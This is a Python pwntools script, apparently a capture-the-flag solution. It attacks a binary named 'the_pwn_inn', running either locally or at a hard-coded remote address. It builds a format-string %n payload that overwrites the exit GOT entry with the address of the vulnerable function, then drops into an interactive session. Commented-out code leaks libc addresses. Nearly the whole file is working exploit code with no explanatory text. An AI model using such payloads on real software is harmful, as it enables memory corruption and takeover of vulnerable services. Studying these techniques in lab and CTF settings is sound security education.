import re
import sys
from pwn import FmtStr, log, context, p64, ELF, args, process, remote, gdb

context.arch = 'amd64'
FILE = './the_pwn_inn'
BINARY = ELF(FILE)
LIBC = ELF('/lib/x86_64-linux-gnu/libc.so.6')
GDB_CMD = [
    'info proc mappings',
    # 'continue'
]
PRINTF = LIBC.symbols['printf']
VULN = BINARY.symbols['vuln']

got_puts = 0x00404020
got_printf = 0x00404030
got_alarm = 0x00404038
got_fgets = 0x00404040
got_signal = 0x00404048
got_setvbuf = 0x00404050
got_exit = 0x00404058


def start():
    if args.REMOTE:
        return remote('161.97.176.150', 2626)

    return process(FILE)

def exec_fmt(payload):
    print(payload)
    proc = start()
    proc.recvline()
    proc.sendline(payload)
    r = proc.recvall()

    return r[len('Welcome '):]

# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset
offset = 6

addresses = []

# for i in range(100):
index = 17
p = start()
p.recvline()
commands = '\n'.join(GDB_CMD)

if not args.REMOTE:
    gdb.attach(p, commands)

# p.sendline('START%{}$pEND'.format(index))
# output = p.recvline()
# offset = 0x1bf6a0
# log.info("Got output: {}".format(output))
# match = re.match(b'Welcome START(.*)END', output)
# if not match:
#     log.error('Couldn\'t parse the output')

# try:
#     addr = int(match.group(1), 0)
#     base_addr = addr - offset
#     log.info("The libc base addr is: {}".format(hex(base_addr)))
# except:
#     sys.exit()
#     # continue

# log.info('Printf address is: {}'.format(hex(PRINTF + base_addr)))

# addresses.append((i, hex(addr)))

# print(addresses)
nwritten = 0
payload = b""
addrs = b""
offset = 16

for index, byte in enumerate(bytearray(p64(BINARY.sym["vuln"]))):
    addrs += p64(got_exit+index)
    num_needed = ((byte - nwritten - 16) & 0xFF) + 16
    payload += "%1${}x%{}$n".format(num_needed, 6+offset+index).encode()
    nwritten += num_needed

assert(len(payload) <= offset*8)

payload += b"\0" * ((offset*8) - len(payload))
payload += addrs

assert(b"\n" not in payload)

p.sendline(payload)
p.interactive()
